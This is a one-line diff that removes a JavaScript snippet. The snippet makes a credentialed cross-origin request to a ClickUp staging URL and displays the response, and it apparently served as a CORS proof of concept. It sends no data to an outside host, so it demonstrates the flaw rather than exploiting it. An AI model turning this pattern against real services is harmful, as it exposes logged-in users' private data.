@@ -1,1 +1,0 @@
-var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://staging.clickup.com/1200154/v/l/14m0u-8',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
